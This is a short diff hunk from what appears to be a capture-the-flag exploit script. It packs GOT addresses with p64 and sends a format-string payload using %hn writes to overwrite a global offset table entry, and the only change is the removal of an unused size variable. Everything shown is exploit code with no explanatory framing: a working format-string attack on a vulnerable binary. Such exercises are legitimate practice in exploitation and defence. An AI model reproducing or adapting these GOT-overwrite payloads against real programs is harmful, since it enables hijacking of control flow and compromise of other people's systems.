@@ -60,7 +60,6 @@ payload = str_to_hex("a" * 44)
 payload += p64(target_got) + p64(target_got + 2) + p64(target_got + 4)
 res = decrypt(payload, 32)
 recv_menu()
-pre_sz = 64 + 1920 + 2110
 payload = str_to_hex("%58$hn%64c%57$hn%1920c%56$hn")
 print(payload)
 res = decrypt(payload, 0)
